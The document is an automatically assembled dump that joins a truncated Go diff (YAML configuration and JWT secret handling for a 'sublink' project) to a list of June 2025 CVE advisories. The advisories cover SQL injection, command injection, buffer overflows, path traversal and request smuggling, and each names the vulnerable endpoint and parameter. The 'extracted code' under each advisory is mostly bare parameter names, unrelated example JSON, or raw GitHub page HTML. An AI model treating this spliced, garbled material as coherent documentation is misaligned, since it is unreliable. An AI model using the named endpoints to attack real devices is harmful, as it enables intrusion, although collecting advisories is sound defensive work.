+var Secret = []byte(models.ReadConfig().JwtSecret) // 从配置文件读取JWT密钥
 
 // JwtClaims jwt声明
 type JwtClaims struct {
diff --git a/models/config.go b/models/config.go
index 9af2c72..f39f571 100644
--- a/models/config.go
+++ b/models/config.go
@@ -1,7 +1,89 @@
 package models
 
+import (
+	"fmt"
+	"log"
+	"os"
+	"sublink/utils"
+
+	"gopkg.in/yaml.v3"
+)
+
+// type Config struct {
+// 	ID    int
+// 	Key   string
+// 	Value string
+// }
+
+// Config 配置结构体
 type Config struct {
-	ID    int
-	Key   string
-	Value string
+	JwtSecret  string `yaml:"jwt_secret"`  // JWT密钥
+	ExpireDays int    `yaml:"expire_days"` // 过期天数
+	Port       int    `yaml:"port"`        // 端口号
+}
+
+var comment string = `# jwt_secret: JWT密钥
+# expire_days: token 过期天数
+# port: 启动端口
+`
+
+// 初始化配置
+func ConfigInit() {
+	// 检查配置文件是否存在
+	if _, err := os.Stat("./db/config.yaml"); os.IsNotExist(err) {
+		R := utils.RandString(31) // 生成随机字符串作为JWT密钥
+		// 如果不存在则创建默认配置文件
+		defaultConfig := Config{
+			JwtSecret:  R, // 生成随机JWT密钥
+			ExpireDays: 14,
+			Port:       8000, // 默认端口
+		}
+
+		// 生成yaml文件
+		data, err := yaml.Marshal(&defaultConfig)
+		if err != nil {
+			log.Println("生成默认配置文件失败:", err)
+			return
+		}
+		data = []byte(comment + string(data)) // 添加注释
+		err = os.WriteFile("./db/config.yaml", data, 0644)
+		if err != nil {
+			fmt.Println("写入文件失败:", err)
+			return
+		}
+		log.Println("配置文件不存在，已创建默认配置文件")
+	}
+}
+
+// 读取配置
+func ReadConfig() Config {
+	file, err := os.ReadFile("./db/config.yaml")
+	if err != nil {
+		log.Println(err)
+	}
+	cfg := Config{}
+	yaml.Unmarshal(file, &cfg)
+	return cfg
+}
+
+// 设置配置
+func SetConfig(newCfg Config) {
+	oldCfg := ReadConfig() // 读取旧的配置文件
+	// 覆盖新的字段
+	if newCfg.JwtSecret != "" {
+		oldCfg.JwtSecret = newCfg.JwtSecret
+	}
+	if newCfg.ExpireDays != 0 {
+		oldCfg.ExpireDays = newCfg.ExpireDays
+	}
+	if newCfg.Port != 0 {
+		oldCfg.Port = newCfg.Port
+	}
+	// 写入文件
+	data, err := yaml.Marshal(&oldCfg)
+	if err != nil {
+		log.Println(err)
+	}
+	data = []byte(comment + string(data)) // 添加注释
+	os.WriteFile("./db/config.yaml", data, 0644)
 }
diff --git a/models/subcription.go b/models/subcription.go
index 6f92200..60aa2dc 100644
--- a/models/subcription.go
+++ b/models/subcription.go
@@ -1,71 +1,154 @@
 package models
 
+import (
+	// 用于将配置解析为结构体
+	"strings" // 用于处理逗号分隔的字符串
+	"time"    // 用于 CreateDate，推荐使用 time.Time
+)
+
+// Subcription 结构体
 type Subcription struct {
-	ID         int
-	Name       string
-	Config     string    `gorm:"embedded"`
-	Nodes      []Node    `gorm:"many2many:subcription_nodes;"` // 多对多关系
-	SubLogs    []SubLogs `gorm:"foreignKey:SubcriptionID;"`    //
... [truncated]

================================================================================


CVE ID: CVE-2025-6668
Published: 2025-06-25T22:15:24.450
Modified: 2025-06-27T17:49:20.193
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Inventory Management System 1.0. It has been classified as critical. This affects an unknown part of the file /php_action/fetchSelectedBrand.php. The manipulation of the argument brandId leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/lijingze-eng/cve/issues/1 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313881 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313881 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602340 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313881 ---
brandId

================================================================================


CVE ID: CVE-2025-6667
Published: 2025-06-25T22:15:24.280
Modified: 2025-07-11T15:53:48.340
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-284: CWE-284
  - CWE-434: Unrestricted Upload of File with Dangerous Type
  - CWE-434: Unrestricted Upload of File with Dangerous Type

Description:
A vulnerability was found in code-projects Car Rental System 1.0 and classified as critical. Affected by this issue is some unknown functionality of the file /admin/add_cars.php. The manipulation of the argument image leads to unrestricted upload. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://code-projects.org/ [Product]
  2. https://github.com/zzb1388/cve/issues/12 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313880 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313880 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602325 [Third Party Advisory, VDB Entry]
  6. https://github.com/zzb1388/cve/issues/12 [Exploit, Issue Tracking, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313880 ---
image

================================================================================


CVE ID: CVE-2025-6665
Published: 2025-06-25T21:15:21.703
Modified: 2025-06-27T17:56:25.200
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability has been found in code-projects Inventory Management System 1.0 and classified as critical. Affected by this vulnerability is an unknown functionality of the file /php_action/editBrand.php. The manipulation of the argument editBrandStatus leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/catfish258/cve/issues/1 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313879 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313879 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602324 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313879 ---
editBrandStatus

================================================================================


CVE ID: CVE-2025-6627
Published: 2025-06-25T19:15:24.260
Modified: 2025-07-16T19:35:19.783
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
A vulnerability has been found in TOTOLINK A702R 4.0.0-B20230721.1521 and classified as critical. This vulnerability affects unknown code of the file /boafrm/formIpv6Setup of the component HTTP POST Request Handler. The manipulation of the argument submit-url leads to buffer overflow. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/d2pq/cve/blob/main/616/24.md [Exploit, Third Party Advisory]
  2. https://github.com/d2pq/cve/blob/main/616/24.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313852 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313852 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602292 [Third Party Advisory, VDB Entry]
  6. https://www.totolink.net/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313852 ---
submit-url

================================================================================


CVE ID: CVE-2025-6621
Published: 2025-06-25T18:15:25.310
Modified: 2025-06-27T18:10:30.697
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
A vulnerability classified as critical has been found in TOTOLINK CA300-PoE 6.2c.884. This affects the function QuickSetting of the file ap.so. The manipulation of the argument hour/minute leads to os command injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (8):
  1. https://github.com/wudipjq/my_vuln/blob/main/totolink4/vuln_47/47.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/totolink4/vuln_47/47.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313839 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313839 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602266 [Third Party Advisory, VDB Entry]
  6. https://www.totolink.net/ [Product]
  7. https://github.com/wudipjq/my_vuln/blob/main/totolink4/vuln_47/47.md [Exploit, Third Party Advisory]
  8. https://github.com/wudipjq/my_vuln/blob/main/totolink4/vuln_47/47.md#poc [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313839 ---
QuickSetting

QuickSetting

hour/minute

================================================================================


CVE ID: CVE-2025-6620
Published: 2025-06-25T18:15:25.137
Modified: 2025-06-27T18:11:26.180
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
A vulnerability was found in TOTOLINK CA300-PoE 6.2c.884. It has been rated as critical. Affected by this issue is the function setUpgradeUboot of the file upgrade.so. The manipulation of the argument FileName leads to os command injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (8):
  1. https://github.com/wudipjq/my_vuln/blob/main/totolink4/vuln_46/46.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/totolink4/vuln_46/46.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313838 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313838 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602265 [Third Party Advisory, VDB Entry]
  6. https://www.totolink.net/ [Product]
  7. https://github.com/wudipjq/my_vuln/blob/main/totolink4/vuln_46/46.md [Exploit, Third Party Advisory]
  8. https://github.com/wudipjq/my_vuln/blob/main/totolink4/vuln_46/46.md#poc [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313838 ---
setUpgradeUboot

setUpgradeUboot

FileName

================================================================================


CVE ID: CVE-2025-6619
Published: 2025-06-25T18:15:24.950
Modified: 2025-06-27T18:19:19.447
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
A vulnerability was found in TOTOLINK CA300-PoE 6.2c.884. It has been declared as critical. Affected by this vulnerability is the function setUpgradeFW of the file upgrade.so. The manipulation of the argument FileName leads to os command injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (8):
  1. https://github.com/wudipjq/my_vuln/blob/main/totolink4/vuln_45/45.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/totolink4/vuln_45/45.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313837 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313837 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602264 [Third Party Advisory, VDB Entry]
  6. https://www.totolink.net/ [Product]
  7. https://github.com/wudipjq/my_vuln/blob/main/totolink4/vuln_45/45.md [Exploit, Third Party Advisory]
  8. https://github.com/wudipjq/my_vuln/blob/main/totolink4/vuln_45/45.md#poc [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313837 ---
setUpgradeFW

setUpgradeFW

FileName

================================================================================


CVE ID: CVE-2025-6618
Published: 2025-06-25T18:15:24.757
Modified: 2025-06-27T18:20:53.133
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
A vulnerability was found in TOTOLINK CA300-PoE 6.2c.884. It has been classified as critical. Affected is the function SetWLanApcliSettings of the file wps.so. The manipulation of the argument PIN leads to os command injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (8):
  1. https://github.com/wudipjq/my_vuln/blob/main/totolink4/vuln_44/44.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/totolink4/vuln_44/44.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313836 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313836 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602263 [Third Party Advisory, VDB Entry]
  6. https://www.totolink.net/ [Product]
  7. https://github.com/wudipjq/my_vuln/blob/main/totolink4/vuln_44/44.md [Exploit, Third Party Advisory]
  8. https://github.com/wudipjq/my_vuln/blob/main/totolink4/vuln_44/44.md#poc [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313836 ---
SetWLanApcliSettings

SetWLanApcliSettings

PIN

================================================================================


CVE ID: CVE-2025-6445
Published: 2025-06-25T18:15:24.610
Modified: 2025-08-08T19:17:57.443
CVSS Score: 8.1 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
ServiceStack FindType Directory Traversal Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of ServiceStack. Interaction with this library is required to exploit this vulnerability but attack vectors may vary depending on the implementation.

The specific flaw exists within the implementation of the FindType method. The issue results from the lack of proper validation of a user-supplied path prior to using it in file operations. An attacker can leverage this vulnerability to execute code in the context of the current process. Was ZDI-CAN-25837.

References (2):
  1. https://docs.servicestack.net/releases/v8_06#reported-vulnerabilities [Release Notes]
  2. https://www.zerodayinitiative.com/advisories/ZDI-25-416/ [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://docs.servicestack.net/releases/v8_06#reported-vulnerabilities ---
/admin

<code class="language-csharp">public class Booking : AuditBase
{
    //..
    [Reference(SelfId=nameof(CreatedBy), RefId=nameof(User.UserName), RefLabel=nameof(User.Name))]
    public User Employee { get; set; }
}


<code class="language-json">{
    &quot;id&quot;: 1,
    &quot;name&quot;: &quot;First Booking!&quot;,
    &quot;roomType&quot;: &quot;Queen&quot;,
    &quot;roomNumber&quot;: 10,
    &quot;bookingStartDate&quot;: &quot;2024-12-01T00:45:50.9098005Z&quot;,
    &quot;bookingEndDate&quot;: &quot;2024-12-08T00:45:50.9098123Z&quot;,
    &quot;cost&quot;: 100,
    &quot;couponId&quot;: &quot;BOOK10&quot;,
    &quot;employee&quot;: {
        &quot;id&quot;: &quot;684201c8-733a-453c-9f91-2004ccf23366&quot;,
        &quot;userName&quot;: &quot;employee@email.com&quot;,
        &quot;firstName&quot;: &quot;Test&quot;,
        &quot;lastName&quot;: &quot;Employee&quot;,
        &quot;displayName&quot;: &quot;Test Employee&quot;,
        &quot;profileUrl&quot;: &quot;/img/profiles/user2.svg&quot;
    },
    &quot;createdDate&quot;: &quot;2024-11-21T00:45:50.9098513Z&quot;,
    &quot;createdBy&quot;: &quot;employee@email.com&quot;,
    &quot;modifiedDate&quot;: &quot;2024-11-21T00:45:50.9098722Z&quot;,
    &quot;modifiedBy&quot;: &quot;employee@email.com&quot;
}


================================================================================


CVE ID: CVE-2025-6617
Published: 2025-06-25T17:15:40.507
Modified: 2025-07-14T17:18:41.617
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability was found in D-Link DIR-619L 2.06B01 and classified as critical. This issue affects the function formAdvanceSetup of the file /goform/formAdvanceSetup. The manipulation of the argument webpage leads to stack-based buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. This vulnerability only affects products that are no longer supported by the maintainer.

References (6):
  1. https://github.com/wudipjq/my_vuln/blob/main/D-Link6/vuln_78/78.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/D-Link6/vuln_78/78.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313835 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313835 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602260 [Third Party Advisory, VDB Entry]
  6. https://www.dlink.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313835 ---
formAdvanceSetup

formAdvanceSetup

webpage

================================================================================


CVE ID: CVE-2025-6616
Published: 2025-06-25T17:15:40.280
Modified: 2025-07-14T17:18:32.097
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability has been found in D-Link DIR-619L 2.06B01 and classified as critical. This vulnerability affects the function formSetWAN_Wizard51 of the file /goform/formSetWAN_Wizard51. The manipulation of the argument curTime leads to stack-based buffer overflow. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. This vulnerability only affects products that are no longer supported by the maintainer.

References (6):
  1. https://github.com/wudipjq/my_vuln/blob/main/D-Link6/vuln_77/77.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/D-Link6/vuln_77/77.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313834 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313834 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602259 [Third Party Advisory, VDB Entry]
  6. https://www.dlink.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313834 ---
formSetWAN_Wizard51

formSetWAN_Wizard51

curTime

================================================================================


CVE ID: CVE-2025-6442
Published: 2025-06-25T17:15:40.117
Modified: 2025-08-18T15:49:38.773
CVSS Score: 5.9 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N

CWE Categories:
  - CWE-444: CWE-444

Description:
Ruby WEBrick read_header HTTP Request Smuggling Vulnerability. This vulnerability allows remote attackers to smuggle arbitrary HTTP requests on affected installations of Ruby WEBrick. This issue is exploitable when the product is deployed behind an HTTP proxy that fulfills specific conditions.

The specific flaw exists within the read_headers method. The issue results from the inconsistent parsing of terminators of HTTP headers. An attacker can leverage this vulnerability to smuggle arbitrary HTTP requests. Was ZDI-CAN-21876.

References (2):
  1. https://github.com/ruby/webrick/commit/ee60354bcb84ec33b9245e1d1aa6e1f7e8132101#diff-ad02984d873efb089aa51551bc6b7d307a53e0ba1ac439e91d69c2e58a478864 [Patch]
  2. https://www.zerodayinitiative.com/advisories/ZDI-25-414/ [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/ruby/webrick/commit/ee60354bcb84ec33b9245e1d1aa6e1f7e8132101#diff-ad02984d873efb089aa51551bc6b7d307a53e0ba1ac439e91d69c2e58a478864 ---






<!DOCTYPE html>
<html
  lang="en"
  
  data-color-mode="auto" data-light-theme="light" data-dark-theme="dark"
  data-a11y-animated-images="system" data-a11y-link-underlines="true"
  
  >




  <head>
    <meta charset="utf-8">
  <link rel="dns-prefetch" href="https://github.githubassets.com">
  <link rel="dns-prefetch" href="https://avatars.githubusercontent.com">
  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">
  <link rel="preconnect" href="https://github.githubassets.com" crossorigin>
  <link rel="preconnect" href="https://avatars.githubusercontent.com">

  


  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/light-6215e264aa81.css" /><link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/light_high_contrast-0d1726fbc5ce.css" /><link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/dark-be3560533a2e.css" /><link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/dark_high_contrast-0f500fc95568.css" /><link data-color-theme="light" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light-6215e264aa81.css" /><link data-color-theme="light_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_high_contrast-0d1726fbc5ce.css" /><link data-color-theme="light_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_colorblind-295e85c7acf3.css" /><link data-color-theme="light_colorblind_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_colorblind_high_contrast-6f7fd702e376.css" /><link data-color-theme="light_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_tritanopia-5810b6198753.css" /><link data-color-theme="light_tritanopia_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_tritanopia_high_contrast-9be09d7c543a.css" /><link data-color-theme="dark" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark-be3560533a2e.css" /><link data-color-theme="dark_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_high_contrast-0f500fc95568.css" /><link data-color-theme="dark_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_colorblind-b93c131e97d5.css" /><link data-color-theme="dark_colorblind_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_colorblind_high_contrast-562d56be7ab1.css" /><link data-color-theme="dark_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_tritanopia-297cb06a83c5.css" /><link data-color-theme="dark_tritanopia_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_tritanopia_high_contrast-9ba270e719b9.css" /><link data-color-theme="dark_dimmed" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_dimmed-64c3ca7e9c26.css" /><link data-color-theme="dark_dimmed_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_dimmed_high_contrast-89581edef127.css" />

  <style type="text/css">
    :root {
      --tab-size-preference: 4;
    }

    pre, code {
      tab-size: var(--tab-size-preference);
    }
  </style>

    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-primitives-15839d47b75d.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-f96b923db733.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/global-241f81e44892.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/github-e41bc01103b7.css" />
  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/repository-5d735668c600.css" />
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/code-9c9b8dc61e74.css" />

  

  <script type="application/json" id="client-env">{"locale":"en","featureFlags":["alternate_user_config_repo","api_insights_show_missing_data_banner","attestations_filtering","attestations_sorting","billing_fixed_amount_metered_configured_discounts","billing_use_current_discounts_list_dialog_v2","client_version_header","codespaces_prebuild_region_target_update","contact_sales_locale_utm_medium","contentful_lp_enterprise","contentful_lp_footnotes","copilot_agent_cli_public_preview","copilot_agent_tasks_btn_code_nav","copilot_agent_tasks_btn_code_view","copilot_agent_tasks_btn_code_view_lines","copilot_agent_tasks_btn_file_reference","copilot_api_agentic_issue_marshal_yaml","copilot_api_draft_issue_code_search","copilot_chat_attach_multiple_images","copilot_chat_file_redirect","copilot_chat_multi_file_picker_attachment","copilot_chat_reduce_quota_checks","copilot_chat_search_bar_redirect","copilot_chat_selection_attachments","copilot_chat_vision_in_claude","copilot_chat_vision_skip_thread_create","copilot_coding_agent_diff_stats","copilot_coding_agent_ga","copilot_custom_copilots","copilot_custom_copilots_feature_preview","copilot_duplicate_thread","copilot_extensions_deprecation_notice","copilot_features_raycast_logo","copilot_file_block_ref_matching","copilot_free_to_paid_telem","copilot_ftp_hyperspace_upgrade_prompt","copilot_ftp_settings_upgrade","copilot_ftp_upgrade_to_pro_from_models","copilot_ftp_your_copilot_settings","copilot_generate_commit_message_regenerate","copilot_global_overlay_v2","copilot_immersive_agent_branch_selection","copilot_immersive_structured_model_picker","copilot_no_floating_button","copilot_read_shared_conversation","copilot_show_copilot_sub_issues_button_on_issues_page","copilot_spaces_as_attachments","copilot_spaces_ga","copilot_spark_allow_empty_commit","copilot_spark_loading_webgl","copilot_spark_progressive_error_handling","copilot_spark_read_iteration_history_from_git_v2","copilot_spark_single_user_iteration","copilot_spark_use_billing_headers","copilot_spark_write_iteration_history_to_git","copilot_stable_conversation_view","copilot_workbench_agent_seed_tool","copilot_workbench_cache","copilot_workbench_connection_reload_banner","copilot_workbench_preview_analytics","copilot_workbench_ratelimit_fallback","copilot_workbench_refresh_on_wsod","copilot_workbench_synthetic_generation","dashboard_public_preview","direct_to_salesforce","dotcom_chat_client_side_skills","failbot_report_error_react_apps_on_page","ghost_pilot_confidence_truncation_25","ghost_pilot_confidence_truncation_40","global_search_multi_orgs","hpc_improve_dom_insertion_observer","hyperspace_diff_view","inp_reduced_threshold","insert_before_patch","issue_fields_report_usage","issues_copilot_cross_repo_assign","issues_copilot_repo_search_in_org","issues_react_blur_item_picker_on_close","issues_react_bots_timeline_pagination","issues_react_prohibit_title_fallback","issues_react_remove_placeholders","issues_sticky_sidebar","lifecycle_label_name_updates","link_contact_sales_swp_marketo","marketing_pages_search_explore_provider","mcp_registry_install","memex_mwl_filter_field_delimiter","migrate_toasts_to_banners_web_notifications","new_traffic_page_banner","non_owner_session_access","override_pulse_legacy_url","pinned_issue_fields","primer_react_segmented_control_tooltip","primer_react_unified_portal_root","record_sso_banner_metrics","releases_update_ref_selector","remove_child_patch","repos_insights_remove_new_url","sample_network_conn_type","scheduled_reminders_updated_limits","show_edit_on_default_option","site_homepage_collaborate_video","site_homepage_contentful","site_msbuild_webgl_hero","spark_commit_on_default_branch","spark_show_data_access_on_publish","spark_sync_repository_after_iteration","viewscreen_sandbox","webp_support","workbench_default_sonnet4","workbench_store_readonly"],"copilotApiOverrideUrl":"https://api.githubcopilot.com"}</script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/high-contrast-cookie-f3788027bd8d.js"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/wp-runtime-b7da31bcdaa2.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_oddbird_popover-polyfill_dist_popover-fn_js-468bf7cab607.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_stacktrace-parser_dist_stack-trace-parser_esm_js-node_modules_github_bro-2f4e04-280c10ec004d.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_arianotify-polyfill_ariaNotify-polyfill_js-node_modules_github_mi-c8eeba-690858154b11.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/environment-e36acb721009.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_primer_behaviors_dist_esm_index_mjs-7e8c9c5d642d.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_selector-observer_dist_index_esm_js-7e4d99c9171d.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_relative-time-element_dist_index_js-c98257dc79a7.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_auto-complete-element_dist_index_js-node_modules_github_catalyst_-0d7d60-b5d92aad9108.js" defer="defer"></script>
